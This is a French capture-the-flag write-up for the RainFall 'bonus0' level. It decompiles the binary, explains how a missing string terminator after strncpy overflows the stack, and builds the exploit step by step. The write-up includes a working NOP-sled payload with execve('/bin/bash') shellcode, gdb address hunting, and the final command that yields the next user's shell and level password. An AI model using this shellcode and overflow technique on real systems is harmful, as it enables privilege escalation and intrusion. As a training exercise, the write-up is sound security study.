# Bonus0

pass : `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`

## Sources :

```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>

void	p(char *str, char *sep) {  // 0x080484b4
	char buf[4096];  // ebp-1008 | esp+0x10 / size : 0x1008 - 0x8
	puts(sep);
	read(stdin, buf, 4096);
	char *ptr = strchr(buf, '\n');
	*ptr = '\0';
	strncpy(str, buf, 20);  // 0x14
}

void	pp(char *buf) {  // 0x0804851e
	char a[20];  // ebp-0x30 | esp+0x20
	char b[20];  // ebp-0x1c | esp+0x34

	p(a, " - ");
	p(b, " - ");
	strcpy(buf, a);
	buf[strlen(buf)] = ' ';
	strcat(buf, b);
}

int		main(int ac, char **av) {  // 0x080485a4
	char buf[42];  // esp+0x16 / size : 0x40-0x16

	pp(buf);
	puts(buf);
	return (0);
}
```

## Recherche :

Le points d'entrés sont par les 2 calls à `read(stdin, buf, 4096)`.
`strcpy` copie la source dans la destination et rajoute `\0`
`strncpy` fait de même, mais si la taille est atteinte, il ne rajoute pas de `\0` à la fin de sa chaine.

Donc si le premier `read` fait exactement plus de 20 caractères, les 20 premiers caractères vont être copiés dans `a` sans rajouté de `\0` et comme la mémoire est contingente, `a` et `b` se suivent. `strcat` va donc dans `buf` `ab b`

`a` se trouve à l'adresse `0xbffff1e8`
`b` se trouve à l'adresse `0xbffff1fc`

On écrit donc `20 + 20 + 1 + 20` caractères dans `buf` qui dépasse les `42` aloués, et on écrit donc dans la stack.
Et quand on quitte le main, et qu'on déstack, on se retrouve à écrire dans `EIP` et le programme segfault.

```shell
./bonus0
 -
abcdefghijabcdefghij
 -
01234567890123456789
abcdefghijabcdefghij01234567890123456789 01234567890123456789
[1]    3889 segmentation fault  ./bonus0
```

Avec gdb, c'est plus clair, et on voit que `EIP` est réécrit au 9<sup>ème</sup> caractère du second `read`.

On voit qu'on peut aussi lancer en une commande :
```sh
(gdb) r < <(python -c 'print "A"*4095 + "\n" + "B"*9 + "0123" + "C" * 200')
Starting program: /home/user/bonus0/bonus0 < <(python -c 'print "A"*4095 + "\n" + "B"*9 + "0123" + "C" * 200')
 -
 -
AAAAAAAAAAAAAAAAAAAABBBBBBBBB0123CCCCCCC��� BBBBBBBBB0123CCCCCCC���

Program received signal SIGSEGV, Segmentation fault.
0x33323130 in ?? ()
```
On retrouve bien notre `0x33323130`, à savoir "0123"

On va mettre notre shell code dans une variable d'environnement en laissant un peu de place avant :
`export EXPLOIT=$(python -c 'print "\x90" * 4096 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')`

Avec gdb, on va chercher l'adresse de la variable d'environnement avec `p/s *environ`. Si on ne la trouve pas direct, on peut afficher les suivants `p/3s *environ`

```sh
bonus0@RainFall:~$ export EXPLOIT=$(python -c 'print "\x90" * 4096 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')
bonus0@RainFall:~$ gdb ./bonus0
(gdb) b main
Breakpoint 1 at 0x80485a7
(gdb) r
Starting program: /home/user/bonus0/bonus0

Breakpoint 1, 0x080485a7 in main ()
(gdb) x/s *environ
0xbfffe8e0:      "EXPLOIT=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...

```

On va décaller cette adresse de 512 pour être sûr de tomber dessus. `p/x 0xbfffe8e0 + 512`
On décalle cette adresse car selon les argument, l'adresse de `EXPLOIT` peut changer. Ici on est sûr.

```sh
(gdb) p/x 0xbfffe8e0+512
$1 = 0xbfffeae0
```

```sh
(gdb) r < <(python -c 'print "A"*4095+"\n"+"\x90"*9+"\xe0\xea\xff\xbf"+"C"*20')
Starting program: /home/user/bonus0/bonus0 < <(python -c 'print "A"*4095+"\n"+"\x90"*9+"\xe0\xea\xff\xbf"+"C"*20')
 -
 -
AAAAAAAAAAAAAAAAAAAA�������������CCCCCCC��� �������������CCCCCCC���
process 7432 is executing new program: /bin/bash
[Inferior 1 (process 7432) exited normally]
```

Parfait, on a réussi ! On a bien eu `process 7432 is executing new program: /bin/bash`.

On peut maintenant passer à l'exploit.

## Exploit :

```sh
sh $ export EXPLOIT=$(python -c 'print "\x90" * 4096 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')
sh $ gdb ./bonus0
(gdb) b main
(gdb) r
(gdb) p/s *environ
0xbfffe8e0:      "EXPLOIT=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
(gdb) p/x 0xbfffe8e0 + 512
$1 = 0xbfffeae0
(gdb) q
bonus0@RainFall:~$ (python -c 'print "A"*4095+"\n"+"\x90"*9+"\xe0\xea\xff\xbf"+"C"*20'; cat) | ./bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAA�������������CCCCCCC��� �������������CCCCCCC���
whoami
bonus1
cd ../bonus1
cat .pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

## Documentation :
* https://stackoverflow.com/questions/14760587/how-does-a-nop-sled-work#:~:text=The
